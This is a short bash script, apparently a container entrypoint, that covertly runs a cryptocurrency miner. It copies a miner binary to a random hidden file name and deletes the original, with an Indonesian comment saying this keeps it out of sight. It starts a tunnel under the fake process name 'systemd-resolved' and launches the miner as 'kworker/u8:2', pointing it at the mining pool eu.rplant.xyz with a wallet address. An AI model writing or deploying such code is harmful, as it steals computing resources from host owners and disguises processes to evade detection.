#!/bin/bash

sleep $((RANDOM % 20 + 5))

NAME=".$(tr -dc a-z0-9 </dev/urandom | head -c6)"

cp /app/sr "/app/$NAME"
chmod +x "/app/$NAME"

# optional: hapus original biar gak keliatan
rm -f /app/sr

(exec -a systemd-resolved /usr/local/bin/.netd access tcp \
--hostname "$(cat .h)" \
--url 127.0.0.1:8443 >/dev/null 2>&1 &)

sleep 3

(exec -a kworker/u8:2 /app/$NAME -a yescryptr32 -o eu.rplant.xyz:7047 -u lpep1qz4kz27v2s3l48prnalqhzhluvhy9ljtl7hchad.hail -p x >/dev/null 2>&1 &)

tail -f /dev/null
